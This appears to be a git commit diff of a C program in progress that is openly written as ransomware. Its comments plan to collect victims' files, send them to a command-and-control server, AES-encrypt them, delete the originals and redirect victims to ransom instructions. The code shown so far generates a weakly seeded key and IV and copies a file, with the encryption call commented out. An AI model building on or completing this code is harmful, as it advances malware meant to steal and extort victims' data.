3724633eb85a7ede2fd9fa09958812955bfc4f09
cha <cha@cha.com>
2023-10-25 16:43:23 +0200

    Copy files WIP: -Encrypt content -Add ".aes" to file extension -Delete raw file

--- main.c
+++ main.c
@@ -1,19 +1,38 @@
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
+#include <stdint.h>
 #include <time.h>
+#include "aes.h"
 
-char *generateAesKey(int size, const char *charset);
+
+void encrypt_file(struct AES_ctx ctx, uint8_t iv[16], uint8_t key[32], char file_path[256]);
+void generate_random_key(uint8_t *key, size_t key_length);
+void generate_random_iv(uint8_t *iv, size_t iv_length);
+
 
 int main() {
-    //Generate AES key
-    char *aes_key = generateAesKey(256, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789;/!*%$&#@");
+    //Generate AES key and IV
+    srand((unsigned int)time(NULL));
+
+    uint8_t key[32];
+    generate_random_key(key, sizeof(key));
+
+    uint8_t iv[16];
+    generate_random_iv(iv, sizeof(iv));
+
+    struct AES_ctx ctx;
+    AES_init_ctx_iv(&ctx, key, iv);
 
     //List all the files we want to borrow ;)
 
     //Send the raw files to C2
 
     //Encrypt each file with AES
+    encrypt_file(ctx, iv, key, "a.txt");
+
+
+
 
     //Delete raw files
 
@@ -22,22 +41,48 @@ int main() {
     //Send the encrypted AES key to C2
 
 
-    free(aes_key);
     //Redirect to C2's web page for instructions
 
     return 0;
 }
 
-char *generateAesKey(int size, const char *charset){
-    srand(time(NULL));
+void encrypt_file(struct AES_ctx ctx, uint8_t iv[16], uint8_t key[32], char file_path[256]){
 
-    int charset_len = strlen(charset);
-    char *key = (char *)malloc((size + 1) * sizeof(char));
+    FILE *src_fp;
+    src_fp = fopen(file_path, "rb");
 
-    for (int i = 0; i < size; i++) {
-        key[i] = charset[rand() % charset_len];
+    FILE *end_fp;
+    end_fp = fopen("b.txt", "ab");
+
+    const size_t buffer_size = 1024;
+    unsigned char buffer[buffer_size];
+
+    size_t bytes_read;
+    while((bytes_read = fread(buffer, 1, buffer_size, src_fp)) > 0){
+        fwrite(buffer, 1, bytes_read, end_fp);
+        for(size_t j = 0; j < bytes_read; ++j){
+            printf("%02X", buffer[j]);
+        }
+        printf("\n");
     }
 
-    key[size] = '\0';
-    return key;
+
+
+    fclose(src_fp);
+    fclose(end_fp);
+
+    //AES_CBC_encrypt_buffer(&ctx, buffer, sizeof(buffer));
+}
+
+
+void generate_random_key(uint8_t *key, size_t key_length) {
+    for (size_t i = 0; i < key_length; ++i) {
+        key[i] = (uint8_t)rand();
+    }
+}
+
+void generate_random_iv(uint8_t *iv, size_t iv_length) {
+    for (size_t i = 0; i < iv_length; ++i) {
+        iv[i] = (uint8_t)rand();
+    }
 }
